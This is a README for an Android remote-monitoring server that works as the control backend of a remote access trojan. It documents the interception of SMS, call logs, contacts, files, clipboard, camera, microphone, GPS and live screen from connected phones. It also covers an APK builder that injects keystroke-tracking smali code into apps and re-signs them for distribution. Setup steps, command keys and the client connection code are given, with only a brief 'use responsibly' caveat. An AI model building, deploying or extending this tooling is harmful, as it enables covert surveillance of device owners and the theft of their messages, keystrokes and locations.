# H4CKINTO - Remote Android Monitoring Server

> An Express-based server for remote Android device management and monitoring

**Author:** Piyush Banik  
**Version:** 1.0.0  
**License:** ISC

---

## 📋 Project Overview

H4CKINTO is a server application that manages remote Android device connections and facilitates real-time monitoring and data collection from connected Android clients. The server provides a web-based control panel for managing devices and receiving surveillance data through WebSocket connections.

---

## ✨ Key Features

### 🔌 Device Management
- Real-time Android device connection tracking
- Device identification and registration
- Online/offline status monitoring
- Geographic location tracking via IP geolocation
- Automatic client ID generation for anonymous devices

### 📡 Real-Time Communication
- WebSocket-based bi-directional communication via Socket.IO
- Support for both WebSocket and polling transports
- Large data transfer support (50MB buffer size)
- Enhanced timeout settings for stable connections

### 📊 Data Collection
- **Files**: Complete file system access and monitoring
- **Contacts**: Contact list retrieval
- **SMS**: SMS message interception and logging
- **Call Logs**: Incoming and outgoing call tracking
- **Location**: GPS coordinates and location tracking
- **Notifications**: Real-time notification logging
- **Media**: Camera and audio recording capabilities
- **Apps**: Installed application list and management
- **Clipboard**: Clipboard content monitoring
- **WiFi**: Network information tracking
- **Screen**: Real-time screen capture and live streaming

### 🛠️ APK Management
- Custom APK building with modified smali code
- APK signing and compilation
- Keystroke tracking and device fingerprinting injection

### 🗄️ Data Storage
- JSON-based database (lowdb)
- Per-device data isolation
- Comprehensive logging system
- File upload resumption support

### 🌐 Web Panel
- EJS template-based web interface
- Device manager dashboard
- Real-time data visualization
- Multi-page device information views

---

## 📁 Project Structure

```
server/
├── index.js                          # Main server entry point
├── package.json                      # Dependencies and metadata
├── maindb.json                       # Main database (clients list)
│
├── includes/                         # Core modules
│   ├── const.js                      # Constants and configuration
│   ├── clientManager.js              # Client connection management
│   ├── databaseGateway.js            # Database abstraction layer
│   ├── logManager.js                 # Logging functionality
│   ├── apkBuilder.js                 # APK compilation and signing
│   ├── expressRoutes.js              # HTTP route definitions
│   └── resumableUploadManager.js     # Chunked file upload handling
│
├── assets/                           # Frontend resources
│   ├── views/                        # EJS templates
│   │   ├── index.ejs                 # Home page
│   │   ├── login.ejs                 # Login page
│   │   ├── deviceManager.ejs         # Main device panel
│   │   ├── builder.ejs               # APK builder interface
│   │   ├── changePassword.ejs        # Password management
│   │   ├── logs.ejs                  # System logs viewer
│   │   └── deviceManagerPages/       # Device-specific views
│   │       ├── apps.ejs              # Installed applications
│   │       ├── contacts.ejs          # Contact list
│   │       ├── sms_manager.ejs       # SMS messages
│   │       ├── call_log.ejs          # Call history
│   │       ├── camera.ejs            # Camera feed
│   │       ├── microphone.ejs        # Audio recording
│   │       ├── gps.ejs               # Location tracking
│   │       ├── file_manager.ejs      # File browser
│   │       ├── screen.ejs            # Screen capture
│   │       ├── live_screen.ejs       # Live streaming
│   │       ├── notifications.ejs     # Notification log
│   │       ├── clipboard_log.ejs     # Clipboard monitor
│   │       ├── wifi_manager.ejs      # Network info
│   │       ├── permissions.ejs       # App permissions
│   │       ├── downloads.ejs         # Download manager
│   │       └── info.ejs              # Device information
│   │
│   ├── webpublic/                    # Static assets
│   │   ├── css/                      # Stylesheets
│   │   │   ├── custom.css            # Custom styles
│   │   │   ├── bootstrap.css         # Bootstrap framework
│   │   │   ├── semantic.min.css      # Semantic UI
│   │   │   ├── animate.css           # Animation library
│   │   │   └── leaflet.css           # Mapping library
│   │   ├── js/                       # JavaScript files
│   │   │   ├── main.js               # Main client script
│   │   │   ├── jquery-3.4.1.min.js   # jQuery
│   │   │   ├── bootstrap.bundle.min.js
│   │   │   ├── semantic.min.js       # Semantic UI JS
│   │   │   └── leaflet.js            # Leaflet mapping
│   │   ├── img/                      # Image assets
│   │   │   └── svg/                  # SVG graphics
│   │   └── client_downloads/         # Downloaded files storage
│
├── app/                              # APK building resources
│   └── factory/
│       ├── apktool.jar               # APK decompilation tool
│       ├── uber-apk-signer-1.1.0.jar # APK signing tool
│       ├── release.jks               # Signing certificate
│       ├── testkey.pk8               # Private key
│       └── decompiled/               # Decompiled APK source
│           ├── AndroidManifest.xml   # Manifest file
│           ├── smali/                # Bytecode files
│           ├── res/                  # Resources
│           └── original/             # Original APK backup
│
├── clientData/                       # Per-device data storage
│   └── blank
│
├── logs/                             # Test files and utilities
│   ├── test_*.js                     # Various test scripts
│   └── ...
│
├── Utility Scripts (Root Level)
│   ├── clean_logs.js                 # Clean log files
│   ├── clear_db.js                   # Clear database
│   ├── complete_reset.js             # Full system reset
│   ├── filter_real_devices.js        # Filter real devices
│   ├── filter_same_ip.js             # Filter by IP address
│   ├── prevent_fake_devices.js       # Fake device prevention
│   ├── reset_db.js                   # Reset database
│   ├── smart_fake_detection.js       # Detect fake devices
│   ├── ultimate_reset.js             # Ultimate reset script
│   └── wipe_all.js                   # Complete wipe
│
└── Documentation
    └── SERVER_FILE_VERIFICATION.md   # File reception verification guide
```

---

## 🚀 Installation & Setup

### Prerequisites
- **Node.js** (v12 or higher)
- **Java** (for APK building)
- **npm** or **yarn**

### Installation Steps

1. **Clone or navigate to the project directory**
   ```bash
   cd server
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Configuration**
   - Review `includes/const.js` for configuration options
   - Set environment variables if needed:
     ```bash
     export STATIC_IP="your_server_ip"
     ```

4. **Start the server**
   ```bash
   npm start
   ```
   Server runs on port **4444** by default

---

## 🔧 Core Components

### 1. **index.js** - Main Server
- Initializes Express and Socket.IO server
- Handles WebSocket connections
- Routes client connections and web panel connections
- Manages command dispatching
- Configured for large data transfers (50MB buffer)
- Ping timeouts: 120s (suitable for large file transfers)

### 2. **clientManager.js** - Connection Management
- Tracks connected Android devices
- Manages client connection lifecycle
- Handles command queuing and execution
- Implements resumable file uploads
- Manages GPS polling for location tracking
- Separates web panel from Android client connections

### 3. **databaseGateway.js** - Data Persistence
- JSON-based database abstraction (lowdb)
- Manages main database (clients list)
- Creates per-device data files
- Handles data read/write operations
- Supports atomic writes

### 4. **logManager.js** - Logging System
- Comprehensive event logging
- Data reception verification
- File type categorization
- Breakdown statistics (extensions, file types)

### 5. **apkBuilder.js** - APK Customization
- Decompiles APK using apktool
- Injects custom smali code
- Modifies manifest and resources
- Recompiles and signs APK
- Generates distributable APK package

### 6. **resumableUploadManager.js** - File Upload
- Chunked upload support
- ACK-based resumption
- Large file handling
- Automatic chunk concatenation

### 7. **expressRoutes.js** - HTTP Routes
- Defines HTTP endpoint handlers
- Web panel authentication
- File download serving
- API endpoints for device management

---

## 📡 Socket.IO Communication

### Connection Types

**Android Client Connection:**
- Includes device parameters: `model`, `manf` (manufacturer), `release` (Android version)
- Provides unique client ID (auto-generated if missing)
- Registered in clientManager for command handling

**Web Panel Connection:**
- No device info parameters
- No client ID provided
- Type parameter: `'web'` or `'webpanel'`
- Used for control interface only

### Socket Events

**Client → Server:**
```javascript
socket.emit('file_list', { files: [...] });
socket.emit('screen_data', { image: base64 });
socket.emit('location_data', { lat: x, lon: y });
socket.emit('sms_data', { messages: [...] });
socket.emit('call_log', { calls: [...] });
// ... other data types
```

**Server → Client:**
```javascript
socket.emit('send_command', { 
    clientID: 'android_xxx', 
    command: { 
        type: 'screen',      // Command type
        action: 'capture'    // Specific action
    }
});
```

### Message Keys
```javascript
'0xSC'  - Screen capture
'0xSS'  - Live screen streaming
'0xCA'  - Camera access
'0xFI'  - File operations
'0xCL'  - Call logs
'0xSM'  - SMS messages
'0xMI'  - Microphone recording
'0xLO'  - Location/GPS
'0xCO'  - Contacts
'0xWI'  - WiFi info
'0xNO'  - Notifications
'0xCB'  - Clipboard
```

---

## 📊 Database Structure

### Main Database (maindb.json)
```json
{
  "clients": [
    {
      "clientID": "android_1234567890_abc",
      "firstSeen": "2024-01-15T10:30:00Z",
      "lastSeen": "2024-01-15T10:35:00Z",
      "isOnline": true,
      "dynamicData": {
        "clientIP": "192.168.1.100",
        "clientGeo": {
          "country": "US",
          "region": "CA",
          "city": "San Francisco"
        },
        "device": {
          "model": "Pixel 5",
          "manufacture": "Google",
          "version": "12"
        }
      }
    }
  ]
}
```

### Client Data Files (clientData/{clientID}.json)
```json
{
  "currentFolder": [
    {
      "name": "image.jpg",
      "type": "Image",
      "extension": ".jpg",
      "size": 2048000
    }
  ],
  "sms": [...],
  "callLog": [...],
  "contacts": [...],
  "location": [...],
  "notifications": [...]
}
```

---

## 🌐 Web Interface Features

### Main Pages
- **index.ejs**: Home/login page
- **deviceManager.ejs**: Primary control dashboard
- **builder.ejs**: APK customization interface
- **logs.ejs**: System event logs

### Device Management Pages
- View and manage connected devices
- Real-time data monitoring
- File browser with download capability
- Contact and SMS management
- Call log review
- GPS location tracking
- Live screen viewing
- Application management
- Clipboard and WiFi monitoring

---

## 📦 Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| express | ^4.17.1 | Web server framework |
| socket.io | ^2.4.1 | Real-time WebSocket communication |
| ejs | ^2.6.2 | Template engine for views |
| body-parser | ^1.19.0 | Request body parsing |
| cookie-parser | ^1.4.4 | Cookie handling |
| express-async-handler | ^1.1.4 | Async error handling |
| lowdb | ^1.0.0 | JSON database |
| geoip-lite | ^1.3.7 | IP geolocation |
| node-fetch | ^2.6.0 | HTTP client |
| socket.io-client | ^2.2.0 | Client-side Socket.IO |

---

## 🛠️ Utility Scripts

### Database Management
- **reset_db.js**: Reset database to initial state
- **clear_db.js**: Clear all database entries
- **complete_reset.js**: Full reset including all data
- **wipe_all.js**: Complete system wipe
- **ultimate_reset.js**: Comprehensive reset utility

### Device Filtering
- **filter_real_devices.js**: Identify genuine Android devices
- **filter_same_ip.js**: Find devices with same IP address
- **prevent_fake_devices.js**: Prevent fake/test device registration
- **smart_fake_detection.js**: Advanced fake device detection

### Maintenance
- **clean_logs.js**: Clean up log files

---

## 🔍 File Reception Verification

The server includes comprehensive logging for file reception:

### Logged Information
- Total item count and breakdown (directories vs files)
- File type categorization (Image, Application, Archive, PDF, etc.)
- File extension breakdown
- Sample file listing (first 20 items)
- Storage verification count

### Example Server Output
```
═══════════════════════════════════════════════════════════
📁 FILE LIST RECEIVED from android_1234567890_abc
   📊 Total items: 25 (Directories: 5, Files: 20)
   📋 File types breakdown:
      - Application: 2
      - Archive: 1
      - Folder: 5
      - Image: 8
      - PDF: 1
      - Text: 2
      - Video: 1
   🔤 Extensions found: 7
      - .apk: 2
      - .jpg: 5
      - .pdf: 1
      - .png: 3
      - .txt: 2
      - .zip: 1
      - .mp4: 1
   📝 Sample files (first 20): ...
═══════════════════════════════════════════════════════════
✅ Stored 25 files in database
```

See [SERVER_FILE_VERIFICATION.md](SERVER_FILE_VERIFICATION.md) for detailed troubleshooting.

---

## 🚀 Usage Example

### Starting the Server
```bash
npm start
# or
node index.js
```

Server will be available at:
- **WebSocket**: ws://localhost:4444
- **HTTP**: http://localhost:4444

### Connecting an Android Client
The Android client connects with device parameters:
```javascript
const socket = io('http://server_ip:4444', {
    query: {
        id: 'device_id',        // Optional, auto-generated if missing
        model: 'Pixel 5',       // Device model
        manf: 'Google',         // Manufacturer
        release: '12'           // Android version
    }
});
```

### Sending Commands
```javascript
// From web panel to Android device
IO.to(clientID).emit('command', {
    type: 'screen',
    action: 'capture'
});
```

---

## 📝 Development Notes

### Key Configuration (const.js)
- **web_port**: 9400 (HTTP server)
- **control_port**: 22222 (Control interface)
- **APK Build Path**: `assets/webpublic/build.apk`
- **Downloads Path**: `assets/webpublic/client_downloads`
- **APK Tool**: `app/factory/apktool.jar`
- **Signing Key**: `app/factory/release.jks`

### Command Queue System
- Prevents concurrent heavy operations
- Queues commands per client
- Tracks active operations
- Implements file batch timers

### Large Data Handling
- 50MB buffer size for large transfers
- 120s ping timeout for stability
- WebSocket with polling fallback
- Resumable upload support

---

## 🔐 Security Considerations

⚠️ **WARNING**: This is a surveillance tool. Use responsibly and only with proper authorization.

- Implement proper authentication
- Secure APK signing certificates
- Protect database files
- Use HTTPS in production
- Validate all client inputs
- Implement rate limiting
- Monitor for unauthorized access

---

## 📞 Support & Troubleshooting

### Common Issues

**1. Server won't start**
- Check Node.js version (v12+)
- Verify port 4444 is available
- Check error logs in console

**2. Android client won't connect**
- Verify server IP and port
- Check network connectivity
- Review Android device logs
- Ensure proper device parameters

**3. File downloads failing**
- Check `assets/webpublic/client_downloads` permissions
- Verify resumable upload manager configuration
- Check disk space availability

**4. APK building fails**
- Verify Java installation
- Check JAR file paths in const.js
- Ensure signing certificate exists
- Review build tool versions

---

## 📄 License

ISC License - See package.json for details

---

## 👤 Author

**Piyush Banik**

---

## 📚 Additional Documentation

- [SERVER_FILE_VERIFICATION.md](SERVER_FILE_VERIFICATION.md) - File reception and verification guide
- Test files in `logs/` directory for implementation examples
- View EJS templates in `assets/views/` for UI structure

---

**Last Updated**: May 2026  
**Version**: 1.0.0
